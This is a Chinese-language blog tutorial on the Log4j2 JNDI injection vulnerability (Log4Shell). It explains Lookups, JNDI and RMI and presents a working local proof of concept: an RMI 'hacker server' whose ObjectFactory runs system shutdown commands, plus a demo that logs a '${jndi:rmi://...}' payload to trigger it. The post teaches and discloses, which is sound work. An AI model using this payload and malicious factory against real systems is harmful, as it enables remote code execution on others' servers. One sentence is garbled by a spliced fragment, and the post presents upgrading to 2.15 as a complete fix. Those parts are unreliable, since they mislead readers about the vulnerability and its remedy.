大家好！我是小六六，三天打鱼，两天晒网！

最近两天，我相信Java圈子讨论最多的就是这个Log4J2的漏洞了，毕竟影响还是很大的

被全球广泛应用的组件Apache Log4j2被曝出一个已存在在野利用的高危漏洞，攻击者仅需一段代码就可远程控制受害者服务器。几乎所有行业都受到该漏洞影响，包括全球多家知名科技公司、电商网站等，漏洞波及面和危害程度均堪比 2017年的“永恒之蓝”漏洞。


## 原因

通过JNDI[注入漏洞](https://www.zhihu.com/search?q=%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265086040%7D)，黑客可以恶意构造特殊数据请求包，触发此漏洞，从而成功利用此漏洞可以在目标服务器上执行任意代码。
注意，此漏洞是可以执行任意代码，这就很恐怖，相当于黑客已经攻入计算机，可以为所欲为了，就像已经进入你家，想干什么，就干什么，比如运行什么程序，植入什么病毒，变成他的肉鸡。


小六六带大家来看看Log4j2的官网，我们先从官网找下答案
https://logging.apache.org/log4j/2.x/manual/lookups.html

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5dc3e4cae03b4019ae0909e9a665247c~tplv-k3u1fbpfcp-watermark.image?)


## 什么是Lookups

Lookups提供了一种在Log4j配置文件任意位置添加值的方法。 它们是实现[StrLookup](https://links.jianshu.com/go?to=%255Bhttp%3A%2F%2Flogging.apache.org%2Flog4j%2F2.x%2Flog4j-core%2Fapidocs%2Forg%2Fapache%2Flogging%2Flog4j%2Fcore%2Flookup%2FStrLookup.html%255D%28http%3A%2F%2Flogging.apache.org%2Flog4j%2F2.x%2Flog4j-core%2Fapidocs%2Forg%2Fapache%2Flogging%2Flog4j%2Fcore%2Flookup%2FStrLookup.html%29)接口的特定类型的插件。 有关如何在配置文件中使用Lookup的信息，请参[Configuration](https://links.jianshu.com/go?to=%255Bhttps%3A%2F%2Fwww.jianshu.com%2Fp%2F1ae5c0f65a9d%255D%28https%3A%2F%2Fwww.jianshu.com%2Fp%2F1ae5c0f65a9d%29)页面的“属性替换”部分。



说直白点 它就是能打印一些特别的字符串，比如我们Java的系统参数，如果我们用容器，用了k8s,它提供出来打印一些参数，这样我们就可以在排查日志的时候。知道获得更多的日志信息了，直接来看我写的demo


![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5338a9b9603041afa1af10ec956291e9~tplv-k3u1fbpfcp-watermark.image?)


那其实，如果仅仅是这个功能的话，其实也没什么，只是把字符串转换成了一些系统参数而已，这并不是最终的原因

## 真正的原因是Lookups是基于Jndi的，这才是它漏洞的根本所在

### 什么是JNDI
JNDI是什么： The Java Naming and Directory Interface，java命名和目录接口，是一组在java应用中访问命名和目录服务的API。为开发人员提供了查找和访问各种命名LDAP来黑掉我们的fu和目录服务的通用、统一的方式。借助于JNDI接口，能够通过名字定位用户、机器、网络、对象服务等
- a. 命名服务： 就像DNS一样，通过命名服务器提供服务，大部分的J2EE服务器都含有命名服务器
- b. 目录服务： 一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息

嗯！按照小六六的理解你把它理解成一个注册中心就成！虽然不一定对哈，你暂时这样理解吧，JNDI其实还需要配合另外一个技术RMI或者LDAP来黑掉我们的服务

### 什么是RMI
其实分布式系统开发，早在0几年的时候就被提出来过，只不过当时的分布式技术并没有现在的那么成熟，今天漏洞的主角RMI,其实指的是JRMI


Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。

Java RMI极大地依赖于接口。在需要创建一个远程对象的时候，程序员通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象句柄正好与本地的根代码连接，由后者负责透过网络通信。这样一来，程序员只需关心如何通过自己的接口句柄发送消息。


> 简单来说这个技术能够做到跨JVM调用，意思是调用一个远程方法，像调用本地方法一样，哈哈是不是感觉和现在的分布式系统开发很像呢？


## 来看看RMI的一个demo


![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5ef4147ed1b5477db87d69348ede7ea3~tplv-k3u1fbpfcp-watermark.image?)


首先我定义2个服务，一个A服务（我称为服务端） 一个B服务（我称为客户端）

A中有三个类


- HelloService
```
package com.xiaoliuliu.a;

import java.rmi.Remote;
import java.rmi.RemoteException;


public interface HelloService extends Remote {
    String sayHello() throws RemoteException;
}
```
- HelloServiceImpl

```
package com.xiaoliuliu.a;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class HelloServiceImpl extends UnicastRemoteObject implements HelloService {
    protected HelloServiceImpl() throws RemoteException {
    }

    public String sayHello() throws RemoteException {
        System.out.println("xiaoliuliu hello!");
        return " xiaoliuliu hello!";
    }


}
```
- A 启动类

```
package com.xiaoliuliu.a;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class A {
    public static void main(String[] args) {
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            registry.bind("hello", new HelloServiceImpl());
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        }
    }

}
```


B中有2个类

- HelloService
```
package com.xiaoliuliu.a;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface HelloService extends Remote {
    String sayHello() throws RemoteException;
}
```

- B 启动类

```
package com.xiaoliuliu.a;

import java.io.IOException;
import java.rmi.NotBoundException;
import java.rmi.RMISecurityManager;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class B {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        try {
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
            HelloService helloService = (HelloService) registry.lookup("hello");
            System.out.println(helloService.sayHello());

        } catch (NotBoundException e) {
            e.printStackTrace();
        }
    }
}
```

然后我们启动A 再启动B 相当于2个JVM之前的调用就完成了



![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b808d9e7e6544c2682c7ecd485fc411a~tplv-k3u1fbpfcp-watermark.image?)



## 最后来看看Log4j是怎么实现这个远程调用的

重点来来，小六六带你一步步去解开这个谜题哈，首先六六这边肯定先启动一个小六六黑客服务端


- HeiKe服务 2个类

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/96e6f79ff810470eadbe05b9c8b088db~tplv-k3u1fbpfcp-watermark.image?)

- OBJ 攻击服务要做的东西

```
package com.xiaoliuliu;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class OBJ implements ObjectFactory {

    static {

        System.out.println("小六六又黑到一台服务器");

        long time=3600L*24*6;
            try {
                //6天后关机
                Runtime.getRuntime().exec("Shutdown -s -t"+time);
                Thread.sleep(1000);
                //取消关机
                Runtime.getRuntime().exec("Shutdown -a ");
            }catch (Exception e){


            }

    }


    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("获取攻击。。。。。");
        return null;
    }
}
```

- Server 启动类

```
package com.xiaoliuliu;
/*
 六六黑客服务端
 */


import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();
        System.out.println("小六六黑客注册成功 6666");

        String className="com.xiaoliuliu.OBJ";
        Reference reference = new Reference(className, className, null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("aaa",referenceWrapper);
        System.out.println("小六六黑客服务器绑定成功");

    }

}
```


然后开最后是怎么黑的


- Demo

```
package com.xiaoliuliu;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Demo {

    private static  final Logger log= LogManager.getLogger();

    public static void main(String[] args) {
        //部分需要这个 看jdk版本
    //    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        String userName="${jndi:rmi://127.0.0.1:1099/aaa}";
        log.info("小六六的名字 {}" ,userName );


    }
}
```


![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5333b2ee31b44360aa50445f3c0331d3~tplv-k3u1fbpfcp-watermark.image?)

看重点，我竟然利用了Log4J执行了 我黑客服务的代码，你就说6不6，这他妈 分分钟搞死你的服务。。。我的天


## 解决方案

解决方案这玩意当然也简单，我把版本神级到2.15就好了，小六六当场给你演示


![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/87a00e3cda554211a345e99053f5ed07~tplv-k3u1fbpfcp-watermark.image?)

看到没有，完美解决！

## 结束

好了，我们来总结下，其实这个漏洞就是可以利用jndi和rmi这2种技术使你部署的服务器执行了我黑客服务器的代码，从而达到黑客的目的。这个问题小六六就给大家讲到这了，好了 我是小六六，三天打鱼，两天晒网！

